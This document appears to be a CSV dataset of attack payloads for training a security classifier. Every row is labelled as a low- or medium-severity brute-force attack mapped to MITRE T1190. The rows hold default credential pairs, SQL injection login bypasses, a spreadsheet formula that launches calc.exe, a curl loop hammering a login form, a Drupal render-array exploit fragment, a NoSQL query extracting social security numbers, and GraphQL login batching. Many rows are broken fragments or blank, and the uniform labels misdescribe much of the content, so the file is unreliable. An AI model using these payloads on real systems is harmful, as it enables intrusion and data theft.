Payload,Signature,AttackType,Severity,MITRE,Label,Description
"012345678901234501234567890123450123456789012345,0123456789012345",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
"11D7D8362528F04266ACACDDEA737589237582526572365723,4C03123456789012",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
"123456789012345678901234567890123456789012345678,123456789012345678901234567890123456789012345678",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
"1234567890123456789012345678901234567890AAAAAAAAAA,123456789012345678901234567890123456789012345678",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
"(""form"": {""email"":""victim@email.com"",""password"":""securepwd""})",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
"4. Look for a password reset URL based on the *host header* like : """,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
    ",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
root:root,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
"2. Inspect the server response and check for """,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
1. Register on the system with a username identical to the victim's username," but with white spaces inserted before and/or after the username. e.g: """,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
Administrator,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
Password123,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
password,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
"print("" * Ejemplo: http(s)://www.victima.com/files.login\n"")",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
"api_key = ""1234567890abcdef""",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
guest:guest,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
    random_value = int(''.join(random.choice('0123456789') for i in range(2))),Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
"=rundll321234567890abcdefghijklmnopqrstuvwxyz|'URL.dll,OpenURL calc.exe'!A",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
admin:admin123,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
bundle:config:db.password,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
"for i in {1..100}; do curl -X POST -d ""username=user&password=wrong"" <target_login_url>; done",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
test:test,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
Set-Cookie: admin=true,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
    url = $target + """"?q=user/password&name[%23post_render][]="""" + phpmethod + """"&name[%23type]=markup&name[%23markup]="""" + evil""",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
"<a id=x href=""ftp:Clobbered-username:Clobbered-Password@a"">",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
echo -n admin | base64,Brute Force,Brute Force,Medium,T1190,Malicious,Brute Force payload from comprehensive dataset
admin,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
admin'﹣﹣,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
admin'--,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
admin,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
",Brute Force,Brute Force,Medium,T1190,Malicious,Brute Force payload from comprehensive dataset
/usr/local/cpanel/logs/login_log%00,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
wp-login.php,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
wp-admin.php,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
/phpmyadmin/changelog.php,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
"# mutation{signIn(login:""Admin"", password:""secretp@ssw0rd""){token}}",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
"login(pass: 1111, username: ""bob"")",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
"second: login(pass: 2222, username: ""bob"")",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
"third: login(pass: 3333, username: ""bob"")",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
"fourth: login(pass: 4444, username: ""bob"")",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
"search: ""{ \""patients.ssn\"": { \""$regex\"": \"".*\""}, \""lastName\"":\""Admin\"" }"")",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
/usr/local/cpanel/logs/login_log,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
/usr/local/cpanel/logs/login_log,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
/usr/local/cpanel/logs/login_log%00,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
"""test"": ""admin""",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
root:root,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
